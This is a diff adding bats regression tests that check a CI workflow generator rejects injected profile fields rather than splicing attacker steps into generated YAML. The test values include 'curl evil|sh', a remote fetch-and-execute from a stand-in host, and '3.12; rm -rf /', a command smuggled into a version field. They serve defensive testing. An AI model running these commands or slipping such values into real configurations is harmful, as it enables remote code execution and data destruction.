@@ -190,3 +190,79 @@ YML
   [ "$status" -ne 0 ]
   [[ "$output" == *"--profile"* ]]
 }
+
+# --- Security: profile-sourced field injection (BUG C) ---
+
+@test "malicious package_manager → rejected, not interpolated into run: step" {
+  # A profile shipped by a (possibly remote) team source carrying a
+  # newline-laden package_manager must not splice an attacker-controlled
+  # step into the generated YAML. gen-ci.sh validates against the known
+  # identifier set and falls back to npm.
+  make_profile typescript npm
+  make_stack typescript
+  # Embed a fake step in the package_manager value.
+  jq '.stack.package_manager = "pnpm\n      - name: pwned\n        run: curl evil|sh"' \
+    "$PROFILE" > "${PROFILE}.tmp" && mv "${PROFILE}.tmp" "$PROFILE"
+  # stdout-only — the rejection warning (stderr) echoes the bad value.
+  yml=$(run_gen --dry-run 2>/dev/null)
+  # The injected step text must NOT appear anywhere in the generated YAML.
+  [[ "$yml" != *"pwned"* ]]
+  [[ "$yml" != *"curl evil"* ]]
+  # And we fell back to the safe default install command.
+  [[ "$yml" == *"npm ci"* ]]
+}
+
+@test "malicious node_version → rejected, not interpolated into version field" {
+  make_profile typescript npm
+  make_stack typescript
+  jq '.ci = { "enabled": true, "node_version": "20\n      - name: pwned\n        run: curl evil|sh" }' \
+    "$PROFILE" > "${PROFILE}.tmp" && mv "${PROFILE}.tmp" "$PROFILE"
+  # Capture stdout only — the validation warning (on stderr) legitimately
+  # echoes the rejected value, so assert against the generated YAML alone.
+  yml=$(run_gen --dry-run 2>/dev/null)
+  [[ "$yml" != *"pwned"* ]]
+  [[ "$yml" != *"curl evil"* ]]
+  # Reverted to the default node version (rendered as a matrix list).
+  [[ "$yml" == *"node-version: [20]"* ]]
+}
+
+@test "malicious python_version → rejected, reverts to default" {
+  make_profile python pip
+  make_stack python
+  jq '.hooks.pre_commit = ["ruff"]' "$PROFILE" > "${PROFILE}.tmp" && mv "${PROFILE}.tmp" "$PROFILE"
+  jq '.ci = { "enabled": true, "python_version": "3.12; rm -rf /\n      - run: pwned" }' \
+    "$PROFILE" > "${PROFILE}.tmp" && mv "${PROFILE}.tmp" "$PROFILE"
+  yml=$(run_gen --dry-run 2>/dev/null)
+  [[ "$yml" != *"pwned"* ]]
+  [[ "$yml" != *"rm -rf"* ]]
+  # Reverted to the default python version.
+  [[ "$yml" == *"python-version: [3.12]"* ]]
+}
+
+@test "valid package_manager + version still interpolate normally" {
+  make_profile typescript pnpm
+  make_stack typescript
+  jq '.ci = { "enabled": true, "node_version": "18.17" }' "$PROFILE" > "${PROFILE}.tmp" && mv "${PROFILE}.tmp" "$PROFILE"
+  run run_gen --dry-run
+  [ "$status" -eq 0 ]
+  [[ "$output" == *"pnpm install --frozen-lockfile"* ]]
+  [[ "$output" == *"18.17"* ]]
+}
+
+# --- Governance template renders correctly (BUG A + BUG B) ---
+
+@test "governance workflow uses correct owner and current pinned version" {
+  make_profile typescript npm
+  make_stack typescript
+  run run_gen --governance --dry-run
+  [ "$status" -eq 0 ]
+  # BUG A: correct GitHub owner (thettwe, not thettweaung).
+  [[ "$output" == *"https://github.com/thettwe/nyann.git"* ]]
+  [[ "$output" != *"thettweaung"* ]]
+  # BUG B: pinned default bumped off the stale 1.3.0.
+  [[ "$output" != *"v\${NYANN_VERSION:-1.3.0}"* ]]
+  # Default tracks the shipping version in plugin.json.
+  local plugin_ver
+  plugin_ver=$(jq -r '.version' "${REPO_ROOT}/.claude-plugin/plugin.json")
+  [[ "$output" == *"v\${NYANN_VERSION:-${plugin_ver}}"* ]]
+}
